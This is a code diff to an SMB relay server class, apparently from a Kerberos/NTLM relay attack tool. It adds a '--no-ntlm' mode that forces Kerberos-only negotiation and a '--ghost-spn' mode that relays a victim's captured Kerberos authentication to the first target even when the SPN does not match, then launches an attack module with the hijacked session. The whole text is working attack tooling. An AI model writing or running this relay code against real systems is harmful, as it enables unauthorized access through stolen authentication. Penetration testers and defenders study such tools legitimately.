@@ -154,9 +154,13 @@ class SMBRelayServer(Thread):
 
         blob = GSSAPIHeader_SPNEGO_Init2()
         blob['tokenOid'] = '1.3.6.1.5.5.2'
-        blob['innerContextToken']['mechTypes'].extend([MechType(TypesMech['KRB5 - Kerberos 5']),
-                                                       MechType(TypesMech['MS KRB5 - Microsoft Kerberos 5']),
-                                                       MechType(TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider'])])
+        mechTypes = [MechType(TypesMech['KRB5 - Kerberos 5']),
+                     MechType(TypesMech['MS KRB5 - Microsoft Kerberos 5'])]
+        if not config.nontlm:
+            mechTypes.append(MechType(TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']))
+        else:
+            LOG.info('NTLM MechType removed from SPNEGO blob (--no-ntlm), forcing Kerberos-only authentication')
+        blob['innerContextToken']['mechTypes'].extend(mechTypes)
         blob['innerContextToken']['negHints']['hintName'] = "not_defined_in_RFC4178@please_ignore"
         respSMBCommand['Buffer'] = encoder.encode(blob)
 
@@ -573,12 +577,18 @@ class SMBRelayServer(Thread):
     def do_relay(self, authdata):
         self.authUser = '%s/%s' % (authdata['domain'], authdata['username'])
         sclass, host = authdata['service'].split('/')
+        LOG.debug('[RELAY] authUser=%s service=%s', self.authUser, authdata['service'])
         for target in self.config.target.originalTargets:
             parsed_target = target
+            LOG.debug('[RELAY] Checking target %s hostname=%s vs SPN host=%s',
+                      parsed_target.scheme, parsed_target.hostname, host)
             if host.lower() in parsed_target.hostname.lower():
                 # Found a target with the same SPN
+                LOG.debug('[RELAY] SPN hostname match found')
                 client = self.config.protocolClients[target.scheme.upper()](self.config, parsed_target)
-                if not client.initConnection(authdata, self.config.dcip):
+                client.initConnection(authdata, self.config.dcip)
+                if not client.session or not client.session.bound:
+                    LOG.error('Relay to %s failed - session not established', parsed_target.netloc.lower())
                     return
                 # We have an attack.. go for it
                 attack = self.config.attacks[parsed_target.scheme.upper()]
@@ -586,7 +596,19 @@ class SMBRelayServer(Thread):
                 client_thread.start()
                 return
         # Still here? Then no target was found matching this SPN
-        LOG.error('No target configured that matches the hostname of the SPN in the ticket: %s', parsed_target.netloc.lower())
+        if self.config.ghostspn and len(self.config.target.originalTargets) > 0:
+            LOG.warning('[GHOST-SPN] SPN hostname %s does not match any target, relaying to first target anyway (--ghost-spn)', host.lower())
+            parsed_target = self.config.target.originalTargets[0]
+            client = self.config.protocolClients[parsed_target.scheme.upper()](self.config, parsed_target)
+            client.initConnection(authdata, self.config.dcip)
+            if not client.session or not client.session.bound:
+                LOG.error('Relay to %s failed - session not established', parsed_target.netloc.lower())
+                return
+            attack = self.config.attacks[parsed_target.scheme.upper()]
+            client_thread = attack(self.config, client.session, self.authUser)
+            client_thread.start()
+        else:
+            LOG.error('No target configured that matches the hostname of the SPN in the ticket: %s', parsed_target.netloc.lower())
 
     def _start(self):
         self.server.daemon_threads=True
